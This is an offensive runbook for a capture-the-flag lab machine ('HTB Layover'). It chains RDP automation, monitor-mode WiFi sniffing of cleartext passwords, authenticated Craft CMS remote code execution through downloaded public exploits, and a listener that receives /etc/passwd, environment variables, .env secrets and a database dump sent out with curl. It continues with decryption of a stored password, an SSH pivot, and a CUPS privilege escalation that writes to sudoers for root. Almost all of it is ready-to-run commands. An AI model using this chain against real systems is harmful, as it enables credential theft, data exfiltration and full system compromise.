# Runbook: Jumpbox → open-WiFi sniff → Craft CMS authed RCE → key reuse → CUPS LPE

**Use when:** Target exposes RDP (3389) with client-provided low-priv creds; the jumpbox carries a simulated open WiFi segment (mac80211_hwsim radios) unreachable from the attack box; an internal portal (Craft CMS 5.x archetype = HTB Layover) is the real target. Jumpbox SSH is dead-by-design (pubkey only) — do not burn time on it.
**Produces:** user.txt + root.txt from the internal server.
**Time:** 60–90 min.
**Prerequisites:** Kali with `xfreerdp`, `xdotool`, `Xvfb`, `import`, `curl`, `php`, `tshark`; `python3+requests` on the jumpbox; jumpbox sudo uses the same password as RDP.

Pattern for all on-box work: **generate a script on Kali into the RDP shared
drive → xdotool-type one short line in the on-box terminal → read
`outN.txt` back from the drive**. Never type long/quoted commands through
xdotool. Anti-spin (R17): same empty/404 result twice → use the step's
"If failed" branch, never re-run.

## Variables (set once, Kali)

```bash
export RDP_IP="10.X.X.X"
export RDP_USER="contractor"
export RDP_PASS="<client-provided>"
export DISP=":95"
export DRV="/tmp/laydrive"          # Kali side of the shared drive
export DN="lay"                     # drive name; on-box: ~/thinclient_drives/$DN
export MON_IF="wlan3"               # on-box monitor radio
export WIFI_SSID="unset"            # set in Step 3A
export PORTAL="unset"               # internal portal vhost, set in Step 3B
export CMS_USER="unset"             # from Step 4 sniff
export CMS_PASS="unset"             # from Step 4 sniff
export WIFIBOX_IP="unset"           # jumpbox IP inside WiFi /24, Step 3B
export CMSHOST_IP="unset"           # portal server IP inside WiFi /24, Step 3C
export LISTEN_PORT="4466"           # exfil listener on the jumpbox
export SSH_USER="unset"            # internal sink account; set after Step 9 (db mail relay user)
export APPDIR="/var/www/portal"     # webroot; confirm from /proc/self/environ in Step 8
mkdir -p "$DRV"
```

## Step 1 — Headless RDP foothold

```bash
Xvfb "$DISP" -screen 0 1280x800x24 >/dev/null 2>&1 &
sleep 1
xfreerdp /v:"$RDP_IP" /u:"$RDP_USER" /p:"$RDP_PASS" /workarea \
  /drive:"$DN","$DRV" /cert:ignore /display:"$DISP" >/dev/null 2>&1 &
sleep 15
DISPLAY="$DISP" import -window root "$DRV/r1.png"
```

Expected output: `r1.png` shows a logged-in Xfce desktop.

If failed:
- login dialog visible → `DISPLAY="$DISP" xdotool type --delay 12 "$RDP_PASS"; DISPLAY="$DISP" xdotool key Return`, screenshot again
- black screen → wait 8 s, screenshot once more
- no RDP service → wrong archetype; switch to `linux-foothold-to-root.md` recon from the VPN side

## Step 2 — Open a terminal; collect basic info

```bash
DISPLAY="$DISP" xdotool key ctrl+alt+t
sleep 1
DISPLAY="$DISP" xdotool type --delay 12 "{ whoami; hostname; ip -4 addr; nmcli dev status; } > ~/thinclient_drives/$DN/step2.txt 2>&1"
DISPLAY="$DISP" xdotool key Return
sleep 3
cat "$DRV/step2.txt"
```

Expected output: file lists `<lowuser>`, hostname (e.g. `airside-ws01`), one internal iface, and 2+ wlan radios (`wlan2`, `wlan3`).

If failed: chars dropped → repeat with `--delay 25`; no terminal from hotkey → click Applications menu, type `terminal`, press Return; still nothing → screenshot to see the box state.

## Step 3A — List WiFi networks (list only)

```bash
DISPLAY="$DISP" xdotool type --delay 12 "nmcli dev wifi list > ~/thinclient_drives/$DN/wifi.txt 2>&1"
DISPLAY="$DISP" xdotool key Return
sleep 4
cat "$DRV/wifi.txt"
```

Expected output: rows with SSID/CHAN/SECURITY; note the open SSID (SECURITY = `--`) and its channel — then set on Kali:

```bash
export WIFI_SSID="<open-ssid-from-list>"
```

If failed: empty list → `rfkill unblock all` via sudo, repeat once; still empty → skip sniffing, look for `/tmp/*.pcap` on the box instead (Step 4 note).

## Step 3B — Join the open WiFi; identify our IP

```bash
cat > "$DRV/step3b.sh" <<EOF
{
nmcli dev wifi connect "$WIFI_SSID"
ip -4 addr show
ip route
} > \$HOME/thinclient_drives/$DN/out3b.txt 2>&1
echo DONE3B >> \$HOME/thinclient_drives/$DN/out3b.txt
EOF
DISPLAY="$DISP" xdotool type --delay 12 "bash ~/thinclient_drives/$DN/step3b.sh"
DISPLAY="$DISP" xdotool key Return
sleep 12
cat "$DRV/out3b.txt"
```

Expected output: `successfully activated`, and the wlan iface has an IP in a NEW /24 (e.g. `10.13.37.x/24`). Set on Kali:

```bash
export WIFIBOX_IP="<jumpbox-ip-in-new-/24>"
```

If failed: `Connection aborted` on open network → re-run once; `Secrets are required` → the network is not open (re-check Step 3A SECURITY column).

## Step 3C — Sweep the new segment for live web hosts

```bash
cat > "$DRV/step3c.sh" <<EOF
NET=\$(ip route | awk '/$WIFIBOX_IP/ {print \$1}' | head -1 | cut -d. -f1-3)
{
for i in \$(seq 1 254); do
  (timeout 0.4 bash -c "echo > /dev/tcp/\$NET.\$i/80" 2>/dev/null && echo "\$NET.\$i:80 up") &
done; wait
} > \$HOME/thinclient_drives/$DN/out3c.txt 2>&1
echo DONE3C >> \$HOME/thinclient_drives/$DN/out3c.txt
EOF
DISPLAY="$DISP" xdotool type --delay 12 "bash ~/thinclient_drives/$DN/step3c.sh"
DISPLAY="$DISP" xdotool key Return
sleep 25
cat "$DRV/out3c.txt"
```

Expected output: 2–3 live hosts — a WiFi gateway (captive portal splash, `.1`), the web/portal server (`.10`-style), sometimes a traffic generator (`.132`-style).

Then identify the portal vhost (usually printed in the gateway's splash page):

```bash
DISPLAY="$DISP" xdotool type --delay 12 "curl -s http://\$NET.1/ | grep -oE 'http://[a-z.]*htb[a-z.]*/[a-z]*' | head -3 > ~/thinclient_drives/$DN/vhost.txt 2>&1"
```

(If that line errors, replace `\$NET.1` with the gateway IP textually.) Read `vhost.txt` and set on Kali:

```bash
export PORTAL="<vhost-hostname>"
export CMSHOST_IP="<web-server-ip-from-sweep>"
```

If failed: no live hosts on 80 → probe 443/8080 once with the same loop (change the port number); still nothing → the portal is IP-only: use the gateway IP as PORTAL.

## Step 4 — Monitor-mode sniff (cleartext creds)

```bash
cat > "$DRV/step4.sh" <<EOF
PW='$RDP_PASS'
O=\$HOME/thinclient_drives/$DN
F=$MON_IF
{
printf '%s\n' "\$PW" | sudo -S sh -c "ip link set \$F down; iw dev \$F set type monitor; ip link set \$F up"
iw dev "\$F" info
printf '%s\n' "\$PW" | sudo -S timeout 180 tshark -i "\$F" -Y "http.request.method==POST" -T fields -e ip.src -e ip.dst -e http.request.uri -e urlencoded-form.key -e urlencoded-form.value > \$O/sniff.txt
grep -iE 'username|password|pass' \$O/sniff.txt | head -8
} > \$O/out4.txt 2>&1
echo DONE4 >> \$O/out4.txt
EOF
DISPLAY="$DISP" xdotool type --delay 12 "bash ~/thinclient_drives/$DN/step4.sh"
DISPLAY="$DISP" xdotool key Return
sleep 200
cat "$DRV/out4.txt"; head -10 "$DRV/sniff.txt"
```

Expected output: `sniff.txt` rows where `urlencoded-form.password = <cleartext>` and the source IP is not `$WIFIBOX_IP`. Set on Kali:

```bash
export CMS_USER="<sniffed-username>"
export CMS_PASS="<sniffed-password>"
printf 'jenny-archetype creds: %s / %s\n' "$CMS_USER" "$CMS_PASS" >> reports/"$RDP_IP"/creds/sniffed-creds.txt 2>/dev/null || true
```

If failed: empty → set the channel explicitly (`iw dev "$MON_IF" set channel <n-from-Step3A>` inside step4.sh) and re-run once; still empty → the lab replays traffic from on-box files: `ls /tmp/*.pcap` on the box and read those instead (this is what Layover did — `cap6.pcap`).

## Step 5 — Craft CMS login check (drive script; cookies stay on-box)

```bash
cat > "$DRV/step5.sh" <<EOF
J=/tmp/jar; rm -f \$J
H='$PORTAL'
{
PG=\$(curl -s -c \$J http://\$H/admin/login)
T=\$(echo "\$PG" | grep -oE 'name="CRAFT_CSRF_TOKEN"[^>]*value="[^"]{20,}"' | head -1 | sed 's/.*value="//; s/"\$//')
echo "token len \${#T}"
C=\$(curl -s -o /dev/null -w '%{http_code}' -b \$J -c \$J -X POST http://\$H/admin/login --data-urlencode "CRAFT_CSRF_TOKEN=\$T" --data-urlencode 'loginName=$CMS_USER' --data-urlencode 'password=$CMS_PASS')
echo "login http \$C"
curl -s -b \$J http://\$H/admin/dashboard -o /dev/null -w 'dashboard http %{http_code}\n'
} > \$HOME/thinclient_drives/$DN/out5.txt 2>&1
echo DONE5 >> \$HOME/thinclient_drives/$DN/out5.txt
EOF
DISPLAY="$DISP" xdotool type --delay 12 "bash ~/thinclient_drives/$DN/step5.sh"
DISPLAY="$DISP" xdotool key Return
sleep 20
cat "$DRV/out5.txt"
```

Expected output: `token len 100+`, `login http 302`, `dashboard http 200`.

If failed: `login http 200` → wrong vhost (add hosts entry: `echo "$CMSHOST_IP $PORTAL" | sudo -S tee -a /etc/hosts` with PW, re-run); `login http 400` → check creds came verbatim from sniff (quotes exact); CMS is not Craft (no `/admin/login` Craft marker) → re-fingerprint and fall back to `cracked-cred-pivot.md`-style fan-out only if available, else re-recon.

## Step 6 — CVE-2026-28695 patch-bypass: blind RCE timing oracle

Fetch the vetted PoC **and read it** (R10) before running:

```bash
curl -sL -o "$DRV/exploit.py" https://raw.githubusercontent.com/gbuyssens/CVE-2026-28695-craft-rce-bypass/main/exploit.py
sed -n '1,60p' "$DRV/exploit.py"    # READ: gadget AttributeTypecastBehavior -> ConsoleProcessus::execute; blind; escapeshellcmd
```

Then timing oracle:

```bash
cat > "$DRV/step6.sh" <<EOF
cd \$HOME/thinclient_drives/$DN
python3 exploit.py http://$PORTAL --check -u '$CMS_USER' -p '$CMS_PASS' 2>&1 | tee out6.txt
echo DONE6 >> \$HOME/thinclient_drives/$DN/out6.txt
EOF
DISPLAY="$DISP" xdotool type --delay 12 "bash ~/thinclient_drives/$DN/step6.sh"
DISPLAY="$DISP" xdotool key Return
sleep 45
cat "$DRV/out6.txt"
```

Expected output: `[+] authenticated as <CMS_USER>`, baseline ~0.1 s, `sleep 5` ~5.1 s, `[+] RCE CONFIRMED`.

If failed: `Login failed` → recheck Step 5; no latency → try the second PoC (`predyy/CVE-2026-28695`, same gadget, different payload layout); still no latency after both → element-search path is patched here; fall back to authenticated upload/admin-hash routes and enumerate CMS surface before continuing.

## Step 7 — File-read primitive (exfil listener on the jumpbox)

```bash
cat > "$DRV/catch7.py" <<EOF
import socketserver, os
class H(socketserver.BaseRequestHandler):
    def handle(self):
        try:
            d = self.request.recv(1048576)
        except Exception:
            d = b''
        with open(os.path.expanduser('~/thinclient_drives/$DN/catch7.txt'), 'ab') as f:
            f.write(b'===CONN===\n' + (d or b'') + b'\n===END===\n')
socketserver.ThreadingTCPServer.allow_reuse_address = True
socketserver.ThreadingTCPServer(('0.0.0.0', $LISTEN_PORT), H).serve_forever()
EOF
```

Fire ONE file per round (clear the file between rounds; each connection reopens):

```bash
fire_read() {  # args: srcfile, tag
  cat > "$DRV/step7.sh" <<EOF
O=\$HOME/thinclient_drives/$DN
{
rm -f \$O/catch7.txt
nohup python3 \$O/catch7.py >/dev/null 2>&1 &
sleep 1
cd \$O
python3 exploit.py http://$PORTAL -u '$CMS_USER' -p '$CMS_PASS' 'curl -m 8 --data-binary @$1 http://$WIFIBOX_IP:$LISTEN_PORT/$2'
sleep 3
} > \$O/out7_$2.txt 2>&1
echo DONE7-$2 >> \$O/out7_$2.txt
EOF
  DISPLAY="$DISP" xdotool type --delay 12 "bash ~/thinclient_drives/$DN/step7.sh"
  DISPLAY="$DISP" xdotool key Return
  sleep 35
  cat "$DRV/out7_$2.txt" 2>/dev/null
}

fire_read /etc/passwd passwd
fire_read /proc/self/environ environ
fire_read /var/www/portal/.env env
```

Expected output: `catch7.txt` gains a `===CONN===` block per fire whose body holds the file. The `environ` block reveals `DOCUMENT_ROOT` — correct `$APPDIR` if `/var/www/portal` is not it.

If failed: `catch7.txt` empty after the fire → egress web→jumpbox blocked; converter B: `cp $1 $APPDIR/web/readback.txt` (webroot writable check first) then `curl -s http://$PORTAL/readback.txt` from Kali; converter C: cp to `/tmp/rb.txt` + `nc -l -p <port>` on the box and read the tee output.

## Step 8 — Collect keys

From `catch7.txt` (or readback.txt), record on Kali:

```bash
grep -aE 'CRAFT_SECURITY_KEY|CRAFT_DB_USER|CRAFT_DB_PASSWORD|CRAFT_DB_DATABASE|DOCUMENT_ROOT' "$DRV/catch7.txt"
export CRAFT_SK="<CRAFT_SECURITY_KEY-value>"
export DB_USER="<CRAFT_DB_USER>"
export DB_PASS="<CRAFT_DB_PASSWORD>"
export DB_NAME="<CRAFT_DB_DATABASE>"
```

Expected output: the four craft vars (and DOCUMENT_ROOT = `$APPDIR`). Save a copy under `reports/$RDP_IP/loot/` (R12: never committed).

## Step 9 — Dump the app-secret table; decrypt with the target's own code

```bash
cat > "$DRV/step9.sh" <<EOF
O=\$HOME/thinclient_drives/$DN
{
rm -f \$O/catch9.txt \$O/catch93.txt
nohup python3 \$O/catch7.py >/dev/null 2>&1 &
sleep 1
cd \$O
python3 exploit.py http://$PORTAL -u '$CMS_USER' -p '$CMS_PASS' 'mysqldump -h127.0.0.1 -u$DB_USER -p$DB_PASS $DB_NAME --result-file=/tmp/bs9.sql'
sleep 2
python3 exploit.py http://$PORTAL -u '$CMS_USER' -p '$CMS_PASS' 'curl -m 15 --data-binary @/tmp/bs9.sql http://$WIFIBOX_IP:$LISTEN_PORT/bs9'
sleep 3
mv \$O/catch7.txt \$O/catch9.txt 2>/dev/null
python3 exploit.py http://$PORTAL -u '$CMS_USER' -p '$CMS_PASS' 'curl -m 8 --data-binary @$APPDIR/vendor/yiisoft/yii2/base/Security.php http://$WIFIBOX_IP:$LISTEN_PORT/security'
sleep 3
mv \$O/catch7.txt \$O/catch93.txt 2>/dev/null
} > \$O/out9.txt 2>&1
echo DONE9 >> \$O/out9.txt
EOF
```

(If the drive filename `catch7.py` was renamed while reusing, keep names consistent — the listener must be the one from Step 7.) Read the results; the SQL dump block contains the encrypted blob — locate it:

```bash
grep -aoE "mailRelayPassword','[^']+'" "$DRV/catch9.txt" | head -2
export BLOB="<base64-blob-value>"
export SK="$CRAFT_SK"
```

Local decrypt (Kali; the framework class from the target, no reimplementation):

```bash
awk 'index($0,"<?php"){p=1} p' "$DRV/catch93.txt" | sed '/===END===/,$d' | tr -d '\r' > /tmp/Security.php
cat > "$DRV/dec.php" <<'PHP'
<?php
namespace yii\base {
  interface Configurable {}
  class BaseObject implements Configurable {
    public function __construct($c = []) { foreach ((array)$c as $k => $v) { $this->$k = $v; } }
    public function __get($n) { return $this->$n; }
    public function __set($n, $v) { $this->$n = $v; }
  }
  class Component extends BaseObject {}
  class Exception extends \Exception {}
  class InvalidConfigException extends Exception {}
  class InvalidArgumentException extends Exception {}
}
namespace yii\helpers {
  class StringHelper {
    public static function byteLength($s) { return strlen($s); }
    public static function byteSubstr($s, $a, $l = null) { return $l === null ? substr($s, $a) : substr($s, $a, $l); }
  }
}
namespace {
  require '/tmp/Security.php';
  $blob = base64_decode(getenv('BLOB'));
  foreach (['AES-128-CBC', 'AES-256-CBC'] as $c) {
    $s = new \yii\base\Security();
    $s->cipher = $c;
    $o = $s->decryptByKey($blob, getenv('SK'));
    echo '[' . $c . '] ' . ($o === false ? 'FAIL' : 'PLAIN:[' . $o . ']') . "\n";
  }
}
PHP
SK="$SK" BLOB="$BLOB" php "$DRV/dec.php"
```

Expected output: `[AES-128-CBC] PLAIN:<plaintext-password>` (FAIL under the other cipher = layout signature `[keySalt][HMAC(32)][IV(16)][ct]`, blob 112/128 B).

If failed: both FAIL → key not from `.env` or blob re-encoded (try double-base64 once); no mysqldump on box → read the module source for the table name (`curl ... @$APPDIR/modules/<app>/*.php` sweep) and mine the Craft CP backup route instead.

## Step 10 — SSH pivot → user flag

```bash
cat > "$DRV/step10.sh" <<EOF
PW='$RDP_PASS'
NP='<PLAIN-plaintext-from-Step-9>'
{
printf '%s\n' "\$PW" | sudo -S apt-get install -y sshpass 2>&1 | tail -1
sshpass -p "\$NP" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $SSH_USER@$CMSHOST_IP 'id; ls -la ~; cat ~/user.txt 2>/dev/null'
} > \$HOME/thinclient_drives/$DN/out10.txt 2>&1
echo DONE10 >> \$HOME/thinclient_drives/$DN/out10.txt
EOF
```

(fill `SSH_USER` from the Step 9 dump before generating — the relay settings row also carries its account name, e.g. `mailRelayUser`; set `export SSH_USER=<name>`). Expected output: `uid=1001(<user>)`, home listing, and the **user flag**. Save:

```bash
mkdir -p reports/"$RDP_IP"/loot
printf 'USER: <flag>\n' > reports/"$RDP_IP"/loot/flags.txt
```

If failed: `Permission denied` → the plaintext is for another sink (mail relay :587, DB admin, CP user) — prove which one (`ss -ltn` was enumerated in Step 3C; try the CP login once), then re-derive SSH from that system's own store.

## Step 11 — CUPS LPE (CVE-2026-34990) → root flag

Surface check (binary + args; safe):

```bash
cups-config --version && ss -ltn | grep ':631'
cat /etc/systemd/system/cups.service 2>/dev/null | grep -i environment
```

Fetch vetted PoC + read (R10):

```bash
curl -sL -o "$DRV/poc_cups.py" https://raw.githubusercontent.com/predyy/CVE-2026-34990/main/poc.py
sed -n '1,40p' "$DRV/poc_cups.py"
```

```bash
cat > "$DRV/step11.sh" <<EOF
NP='<PLAIN-plaintext-from-Step-9>'
{
sshpass -p "\$NP" scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \$HOME/thinclient_drives/$DN/poc_cups.py $SSH_USER@$CMSHOST_IP:/tmp/lpe.py
sshpass -p "\$NP" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $SSH_USER@$CMSHOST_IP 'python3 /tmp/lpe.py 2>&1 | tail -6'
sshpass -p "\$NP" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $SSH_USER@$CMSHOST_IP 'sudo -n id; sudo -n cat /root/root.txt'
} > \$HOME/thinclient_drives/$DN/out11.txt 2>&1
echo DONE11 >> \$HOME/thinclient_drives/$DN/out11.txt
EOF
DISPLAY="$DISP" xdotool type --delay 12 "bash ~/thinclient_drives/$DN/step11.sh"
DISPLAY="$DISP" xdotool key Return
sleep 90
cat "$DRV/out11.txt"
```

Expected output: `[+] captured token: <hex>`, `[+] wrote /etc/sudoers.d/<user>-pwn`, `[+] ROOT: uid=0(root)`, then the **root flag**.

If failed: `token leak failed` → re-run once (race-dependent); no write → try the alternative PoC (`ungabunga-ctf/CVE-2026-34990`, `TARGET="/etc/sudoers.d/<user>"`); still nothing after 3 distinct attempts → switch to `linux-foothold-to-root.md` from the step-10 shell.

## End condition

- `reports/<RDP_IP>/loot/flags.txt` holds both flag values
- `reports/<RDP_IP>/report.md` documents the chain
- creds file chain under `reports/<RDP_IP>/creds/` (never committed)

## Anti-spin table

| Symptom | Cause | Exit |
|---|---|---|
| sniff empty twice | channel/AP drift or replayed traffic | Step 4 "If failed" → on-box pcaps |
| exploit.py argparse error | wrong flags (`-c`, `--timeout`) | command is the single positional arg; no other flags exist |
| catch7.txt empty | egress web→jumpbox blocked | Step 7 converter B (cp-to-webroot) |
| decrypt FAIL both ciphers | wrong key/blob pairing | Step 9 "If failed" |
| sudoers write ok, `sudo -n` fails | perms/format | `sudo -n cat /etc/sudoers.d/*` check, then linux-foothold runbook |
| same 404/empty any step | answered vector | next hypothesis; never a third identical run |